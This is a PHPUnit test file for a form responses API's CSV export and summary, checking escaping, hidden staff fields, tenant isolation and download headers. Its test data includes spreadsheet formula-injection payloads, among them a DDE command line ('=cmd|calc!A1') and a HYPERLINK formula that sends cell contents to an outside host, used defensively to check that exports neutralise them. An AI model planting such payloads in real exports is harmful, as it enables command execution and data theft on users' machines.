<?php

declare(strict_types=1);

namespace Tests\Api;

use PDO;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Tests\Support\SchemaFromMigrations;
use Whity\Api\FormResponsesApiHandler;
use Whity\Core\Form\FormFieldRepository;
use Whity\Core\Form\FormRepository;
use Whity\Core\Form\FormSubmissionRepository;
use Whity\Core\Form\ResponsesCsv;
use Whity\Core\Request;
use Whity\Core\Tenant\TenantContext;
use Whity\Sdk\Http\Response;

/**
 * The summary and the export. Answers here are invented, and a few are deliberately
 * hostile, because a public form's answers come from strangers.
 */
final class FormResponsesApiRealEngineTest extends TestCase
{
    private const TENANT = 1;
    private const OTHER_TENANT = 2;

    private PDO $pdo;
    private FormRepository $forms;
    private FormFieldRepository $fields;
    private FormSubmissionRepository $submissions;
    private FormResponsesApiHandler $api;
    private int $formId;

    protected function setUp(): void
    {
        $this->pdo = SchemaFromMigrations::make();
        $this->pdo->exec("INSERT INTO tenants (id, name, slug) VALUES (1, 'Example Bakery', 'example-bakery')");
        $this->pdo->exec("INSERT INTO tenants (id, name, slug) VALUES (2, 'Other Bakery', 'other-bakery')");
        $this->pdo->exec("
            INSERT INTO profiles (id, display_name, password_hash, two_factor_enabled,
                                  two_factor_backup_codes_version, token_epoch, created_at, updated_at)
            VALUES (10, '=HYPERLINK(\"http://example.test\")', 'x', false, 0, 0, NOW(), NOW())
        ");

        $this->forms = new FormRepository($this->pdo);
        $this->fields = new FormFieldRepository($this->pdo);
        $this->submissions = new FormSubmissionRepository($this->pdo);
        $this->api = new FormResponsesApiHandler($this->forms, $this->fields, $this->submissions);

        $this->formId = $this->forms->create(self::TENANT, 'supplier_request', ['en' => 'Supplier request'], null, null, null);
        $choices = [
            ['value' => 'flour', 'label' => ['en' => 'Flour', 'ar' => 'طحين']],
            ['value' => 'milk', 'label' => ['en' => 'Milk', 'ar' => 'حليب']],
        ];
        $this->fields->create(self::TENANT, $this->formId, 'supplier', 'text', ['en' => 'Supplier', 'ar' => 'المورد'], null, false, [], [], null, null, 1);
        $this->fields->create(self::TENANT, $this->formId, 'kind', 'select', ['en' => 'Kind'], null, false, $choices, [], null, null, 2);
        $this->fields->create(self::TENANT, $this->formId, 'kinds', 'multiselect', ['en' => 'Kinds'], null, false, $choices, [], null, null, 3);
        $this->fields->create(self::TENANT, $this->formId, 'imports', 'checkbox', ['en' => 'Imports'], null, false, [], [], null, null, 4);
        $this->fields->create(self::TENANT, $this->formId, 'crates', 'number', ['en' => 'Crates'], null, false, [], [], null, null, 5);
        $this->fields->create(self::TENANT, $this->formId, 'paper', 'file', ['en' => 'Paper'], null, false, [], ['maxFiles' => 3], null, null, 6);
        $this->fields->create(self::TENANT, $this->formId, 'decision', 'text', ['en' => 'Decision'], null, false, [], [], null, null, 7, null, 'staff');

        TenantContext::reset();
        TenantContext::setTenantId(self::TENANT);
    }

    protected function tearDown(): void
    {
        TenantContext::reset();
    }

    /**
     * @param array<string, mixed> $answers
     */
    private function respond(array $answers, ?int $profileId = null): void
    {
        $this->submissions->create(self::TENANT, $this->formId, 1, $profileId, null, $answers);
    }

    /**
     * @return list<list<string>>
     */
    private function exportRows(string $query = ''): array
    {
        $response = $this->api->export(new Request('GET', '/x' . $query), ['id' => (string) $this->formId]);
        self::assertSame(200, $response->getStatusCode());

        $body = (string) $response->getBody();
        self::assertStringStartsWith("\xEF\xBB\xBF", $body);

        $stream = fopen('php://temp', 'r+');
        self::assertIsResource($stream);
        fwrite($stream, substr($body, 3));
        rewind($stream);
        $rows = [];
        while (($row = fgetcsv($stream, null, ',', '"', '')) !== false) {
            /** @var list<string> $row */
            $rows[] = $row;
        }
        fclose($stream);

        return $rows;
    }

    /**
     * @return array<string, mixed>
     */
    private function summary(): array
    {
        /** @var array{data: array<string, mixed>} $decoded */
        $decoded = json_decode((string) $this->api->summary(new Request('GET', '/x'), ['id' => (string) $this->formId])->getBody(), true);

        return $decoded['data'];
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function formulas(): array
    {
        return [
            'equals' => ['=1+1'],
            'plus' => ['+1+1'],
            'minus' => ['-1+1'],
            'at' => ['@SUM(A1)'],
            'tab' => ["\t=1+1"],
            'return' => ["\r=1+1"],
            'hidden by spaces' => ['   =1+1'],
            'hidden by a right-to-left mark' => ["\u{200F}=1+1"],
            'full-width equals' => ['＝1+1'],
            'full-width at' => ['＠SUM(A1)'],
            'the classic' => ['=HYPERLINK("http://example.test?x="&A1,"Click")'],
        ];
    }

    #[DataProvider('formulas')]
    public function testAFormulaBecomesText(string $hostile): void
    {
        self::assertSame("'" . $hostile, ResponsesCsv::safeText($hostile));
    }

    public function testOrdinaryTextIsLeftAlone(): void
    {
        foreach (['Example Mill', 'طحين', 'a=b', 'user@example.test', '', '12-3'] as $text) {
            self::assertSame($text, ResponsesCsv::safeText($text));
        }
    }

    public function testAHostileAnswerAndNameCannotRunInASpreadsheet(): void
    {
        $this->respond(['supplier' => '=cmd|calc!A1'], 10);

        $rows = $this->exportRows();

        self::assertSame("'=cmd|calc!A1", $rows[1][4]);
        self::assertStringStartsWith("'=HYPERLINK", $rows[1][2]);
    }

    public function testAHostileQuestionLabelIsMadeSafeToo(): void
    {
        $this->fields->create(self::TENANT, $this->formId, 'evil', 'text', ['en' => '=1+1'], null, false, [], [], null, null, 8);

        self::assertContains("'=1+1", $this->exportRows()[0]);
    }

    public function testANegativeNumberFromANumberQuestionStaysANumber(): void
    {
        $this->respond(['crates' => -5]);

        self::assertSame('-5', $this->exportRows()[1][8]);
    }

    public function testChoicesAreWordedAndStaffAnswersAreLeftOut(): void
    {
        $this->respond(['supplier' => 'Example Mill', 'kind' => 'flour', 'kinds' => ['flour', 'milk'], 'imports' => true, 'decision' => 'secret']);

        $rows = $this->exportRows();

        self::assertSame(
            ['Reference', 'Submitted at', 'Submitted by', 'Routing', 'Supplier', 'Kind', 'Kinds', 'Imports', 'Crates', 'Paper'],
            $rows[0],
        );
        self::assertSame(['Example Mill', 'Flour', 'Flour, Milk', 'Yes'], array_slice($rows[1], 4, 4));
        self::assertStringNotContainsString('secret', implode(',', $rows[1]));
    }

    public function testFileAnswersDoNotLeakTheStorageKey(): void
    {
        $this->respond(['paper' => ['tenants/1/form-uploads/7/a.pdf', 'tenants/1/form-uploads/7/b.pdf']]);

        $rows = $this->exportRows();

        self::assertSame('2 attached', $rows[1][9]);
    }

    public function testTheLanguageCanBeAsked(): void
    {
        $this->respond(['kind' => 'flour']);

        $rows = $this->exportRows('?language=ar');

        self::assertContains('المورد', $rows[0]);
        self::assertSame('طحين', $rows[1][5]);
    }

    public function testAQuoteOrNewlineInAnAnswerStaysInItsCell(): void
    {
        $this->respond(['supplier' => "Mill \"North\"\nSecond line, with a comma"]);

        self::assertSame("Mill \"North\"\nSecond line, with a comma", $this->exportRows()[1][4]);
    }

    public function testTheResponseIsADownloadNobodyCaches(): void
    {
        $response = $this->api->export(new Request('GET', '/x'), ['id' => (string) $this->formId]);
        $headers = array_change_key_case($response->getHeaders());

        self::assertStringContainsString('text/csv', (string) $headers['content-type']);
        self::assertStringContainsString('attachment; filename="supplier_request-responses.csv"', (string) $headers['content-disposition']);
        self::assertSame('private, no-store', $headers['cache-control']);
    }

    public function testAnotherWorkspaceCannotExportOrSummarise(): void
    {
        TenantContext::reset();
        TenantContext::setTenantId(self::OTHER_TENANT);

        self::assertSame(404, $this->api->export(new Request('GET', '/x'), ['id' => (string) $this->formId])->getStatusCode());
        self::assertSame(404, $this->api->summary(new Request('GET', '/x'), ['id' => (string) $this->formId])->getStatusCode());
    }

    public function testTheSummaryCountsChoicesAndLeavesTextOut(): void
    {
        $this->respond(['supplier' => 'a', 'kind' => 'flour', 'kinds' => ['flour', 'milk'], 'imports' => true]);
        $this->respond(['supplier' => 'b', 'kind' => 'flour', 'imports' => false]);
        $this->respond(['supplier' => 'c', 'kind' => 'milk', 'decision' => 'x']);

        $summary = $this->summary();

        self::assertSame(3, $summary['total']);
        self::assertSame(3, $summary['routing']['not_routed']);
        $questions = array_column($summary['questions'], null, 'field_key');
        self::assertSame(['kind', 'kinds', 'imports'], array_keys($questions));
        self::assertSame(3, $questions['kind']['answered']);
        self::assertSame(
            ['flour' => 2, 'milk' => 1],
            array_column($questions['kind']['options'], 'count', 'value'),
        );
        // assertEquals: the order of a label's languages means nothing, and JSONB changes it.
        self::assertEquals(['en' => 'Flour', 'ar' => 'طحين'], $questions['kind']['options'][0]['label']);
        self::assertSame(['flour' => 1, 'milk' => 1], array_column($questions['kinds']['options'], 'count', 'value'));
        self::assertSame(['false' => 1, 'true' => 1], array_column($questions['imports']['options'], 'count', 'value'));
    }

    public function testALabelFallsBackInTheSameOrderHoweverItsKeysAreStored(): void
    {
        $field = ['field_key' => 'kind', 'field_type' => 'text'];
        $first = ResponsesCsv::build([$field + ['label' => ['ar' => 'نوع', 'en' => 'Kind', 'de' => 'Art']]], [], 'fr');
        $second = ResponsesCsv::build([$field + ['label' => ['de' => 'Art', 'en' => 'Kind', 'ar' => 'نوع']]], [], 'fr');

        self::assertSame($first, $second);
        self::assertStringContainsString('Kind', $first);
    }

    public function testResponsesPerWeekIncludesQuietWeeks(): void
    {
        $this->respond(['supplier' => 'a']);

        $weeks = $this->summary()['per_week'];

        self::assertCount(12, $weeks);
        self::assertSame(1, $weeks[11]['count']);
        self::assertSame(0, $weeks[0]['count']);
    }

    public function testAFormWithNoResponsesSummarisesToNothing(): void
    {
        $summary = $this->summary();

        self::assertSame(0, $summary['total']);
        self::assertFalse($summary['truncated']);
        self::assertCount(3, $summary['questions']);
    }
}
